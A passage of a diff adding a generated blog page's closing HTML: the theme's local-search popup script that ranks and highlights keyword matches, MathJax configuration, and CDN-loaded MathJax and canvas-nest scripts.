+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script type="text/javascript" color="255,0,0" opacity='0.7' zIndex="-2" count="80" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
